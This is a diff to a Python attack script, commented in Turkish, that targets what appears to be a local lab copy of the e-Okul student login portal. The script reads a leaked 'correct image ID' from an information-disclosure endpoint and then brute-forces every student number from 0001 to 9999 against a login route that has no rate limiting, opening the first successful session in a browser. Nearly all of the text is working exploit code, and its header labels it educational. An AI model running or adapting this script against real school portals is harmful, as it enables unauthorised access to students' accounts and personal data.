@@ -1,9 +1,11 @@
 """
 e-Okul VBS Brute-Force Exploit Script
 ======================================
-Bu script, /login rotasında rate limiting olmamasından faydalanarak
-0001'den 9999'a kadar tüm öğrenci numaralarını deneyerek
-geçerli giriş bilgilerini bulmaya çalışır.
+Bu script, iki zafiyeti zincirleme (chain) kullanır:
+  1. Information Disclosure: /api/verification-data endpoint'inden
+     doğru resim ID'sini alır (sunucu cevabı sızdırır).
+  2. Brute-Force: /login endpoint'inde rate limiting olmamasından
+     faydalanarak 0001-9999 arası tüm öğrenci numaralarını dener.
 
 UYARI: Bu script yalnızca eğitim amaçlıdır.
 Gerçek sistemlerde bu tür saldırılar yasa dışıdır.
@@ -11,27 +13,52 @@ Gerçek sistemlerde bu tür saldırılar yasa dışıdır.
 
 import requests
 import time
+import webbrowser
 
 # ============================================================
 # Hedef sunucu ayarları
 # ============================================================
-TARGET_URL = "http://localhost:3000/login"
+BASE_URL = "http://localhost:3000"
+LOGIN_URL = f"{BASE_URL}/login"
+VERIFICATION_URL = f"{BASE_URL}/api/verification-data"
 
 # Sabit tutulan değerler (saldırgan bunları bildiğini varsayıyor)
 CITY = "ANKARA"
-SELECTED_IMAGE_ID = "3"
 
 # Brute-force aralığı
 START = 1
 END = 9999
 
+def get_correct_image_id():
+    """
+    Information Disclosure zafiyetini kullanarak doğru resim ID'sini al.
+    Sunucu, /api/verification-data endpoint'inde doğru cevabı açıkça gönderiyor.
+    """
+    try:
+        response = requests.get(VERIFICATION_URL)
+        data = response.json()
+        correct_id = str(data.get("correctImageId"))
+        return correct_id
+    except Exception as e:
+        print(f"  [!] Doğrulama verisi alınamadı: {e}")
+        return None
+
 def brute_force():
     print("=" * 60)
     print("  e-Okul VBS Brute-Force Saldırısı Başlatılıyor...")
     print("=" * 60)
-    print(f"  Hedef      : {TARGET_URL}")
+    print(f"  Hedef      : {LOGIN_URL}")
     print(f"  Şehir      : {CITY}")
-    print(f"  Resim ID   : {SELECTED_IMAGE_ID}")
+
+    # Önce Information Disclosure zafiyetini kullanarak doğru resim ID'sini al
+    print()
+    print("  [*] Information Disclosure zafiyeti kullanılıyor...")
+    correct_image_id = get_correct_image_id()
+    if not correct_image_id:
+        print("  [!] Doğru resim ID'si alınamadı, çıkılıyor.")
+        return
+    print(f"  [+] Doğru resim ID'si sızdırıldı: {correct_image_id}")
+
     print(f"  Aralık     : {START:04d} - {END:04d}")
     print("=" * 60)
     print()
@@ -52,11 +79,11 @@ def brute_force():
         payload = {
             "city": CITY,
             "studentNo": student_no,
-            "selectedImageId": SELECTED_IMAGE_ID
+            "selectedImageId": correct_image_id
         }
 
         try:
-            response = requests.post(TARGET_URL, json=payload)
+            response = requests.post(LOGIN_URL, json=payload)
             data = response.json()
 
             if data.get("success"):
@@ -66,11 +93,16 @@ def brute_force():
                 print(f"  [+] BASARILI GIRIS BULUNDU!")
                 print(f"  [+] Ogrenci Numarasi : {student_no}")
                 print(f"  [+] Sehir            : {CITY}")
-                print(f"  [+] Resim ID         : {SELECTED_IMAGE_ID}")
+                print(f"  [+] Resim ID         : {correct_image_id}")
+                print(f"  [+] Redirect URL     : {data.get('redirectUrl')}")
                 print(f"  [+] Sunucu Yaniti    : {data.get('message')}")
                 print(f"  [+] Toplam Deneme    : {attempted}")
                 print(f"  [+] Gecen Sure       : {elapsed:.2f} saniye")
                 print("!" * 60)
+                # Otomatik olarak tarayıcıda aç
+                redirect_url = f"{BASE_URL}{data.get('redirectUrl')}"
+                print(f"\n  [*] Tarayıcı açılıyor: {redirect_url}")
+                webbrowser.open(redirect_url)
                 return
 
         except requests.exceptions.ConnectionError:
